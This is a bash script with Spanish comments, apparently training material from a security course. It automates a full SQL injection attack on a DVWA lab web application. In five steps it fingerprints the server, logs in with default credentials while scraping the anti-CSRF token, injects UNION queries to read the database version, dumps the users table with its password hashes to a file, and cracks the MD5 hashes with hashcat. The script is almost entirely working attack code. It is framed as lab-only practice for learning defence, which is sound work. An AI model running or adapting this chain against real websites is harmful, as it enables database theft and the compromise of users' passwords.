#!/usr/bin/env bash
# hackweb.sh - cadena completa de un ataque a la web de una empresa por inyeccion SQL,
# de principio a fin, en un laboratorio AISLADO y contra una web PROPIA (DVWA).
#
#   ./hackweb.sh [http://IP]  [diccionario]
#
# Pasos (los mismos que hicimos a mano, encadenados en una sola orden):
#   [1] fingerprint  -> que servidor y tecnologia usa la web
#   [2] sesion       -> login + cookie (roba el token anti-CSRF, nivel low = vulnerable)
#   [3] inyeccion    -> le cuela una consulta: version y usuario de la base de datos
#   [4] volcado      -> roba la tabla de usuarios entera (usuario + hash)
#   [5] crackeo      -> rompe los hashes MD5 con un diccionario
#
# SOLO contra sistemas propios y autorizados. Laboratorio aislado, sin salida a internet.
# Atacamos para ENTENDER como defender. Morini Computers - Ciberseguridad.
set -u
WEB="${1:-http://10.13.37.30}"                 # la web objetivo (mia, en el lab aislado)
DIC="${2:-/root/diccionario.txt}"              # diccionario para el crackeo offline
SQLI="$WEB/vulnerabilities/sqli/"              # el buscador vulnerable (parametro id)
JAR="$(mktemp)"

# renderiza el bloque <pre> de la respuesta en una linea legible
render(){ grep -oP "(?<=<pre>).*?(?=</pre>)" | sed "s#<br />#  |  #g"; }
# roba el token anti-CSRF (campo oculto user_token) del HTML de una pagina
tok(){ grep -oE "user_token' value='[0-9a-f]+'" | grep -oE "[0-9a-f]{16,}" | head -1; }

echo "### [1] FINGERPRINT - que hay detras de la web"
curl -sI "$WEB/" | grep -iE "Server|X-Powered"

echo; echo "### [2] SESION - inicio sesion y me quedo con la cookie (nivel low = vulnerable)"
T1=$(curl -s -c "$JAR" "$WEB/login.php" | tok)
curl -s -b "$JAR" -c "$JAR" -L --data-urlencode "username=admin" --data-urlencode "password=password" \
     --data-urlencode "user_token=$T1" --data "Login=Login" "$WEB/login.php" >/dev/null
T2=$(curl -s -b "$JAR" -c "$JAR" "$WEB/security.php" | tok)
curl -s -b "$JAR" -c "$JAR" --data "security=low" --data "seclev_submit=Submit" \
     --data-urlencode "user_token=$T2" "$WEB/security.php" >/dev/null
COOKIE="PHPSESSID=$(awk '/PHPSESSID/{print $7}' "$JAR"); security=low"; rm -f "$JAR"
echo "cookie de sesion lista."

echo; echo "### [3] INYECCION - le cuelo mi consulta: version y usuario de su base de datos"
curl -s -b "$COOKIE" "$SQLI?id=0%27+UNION+SELECT+@@version,current_user()--+-&Submit=Submit" | render

echo; echo "### [4] VOLCADO - le robo la tabla de usuarios entera (usuario + hash)"
curl -s -b "$COOKIE" "$SQLI?id=0%27+UNION+SELECT+user,password+FROM+users--+-&Submit=Submit" | render
curl -s -b "$COOKIE" "$SQLI?id=0%27+UNION+SELECT+user,password+FROM+users--+-&Submit=Submit" \
  | grep -oE "[a-f0-9]{32}" | sort -u > /root/hashes_robados.txt
echo "-> hashes guardados en /root/hashes_robados.txt"

echo; echo "### [5] CRACKEO - rompo los hashes MD5 con el diccionario"
hashcat -m 0 -a 0 /root/hashes_robados.txt "$DIC" --force --potfile-disable --quiet 2>/dev/null

echo; echo "### FIN - de una web a sus contrasenas en claro, en una sola orden."
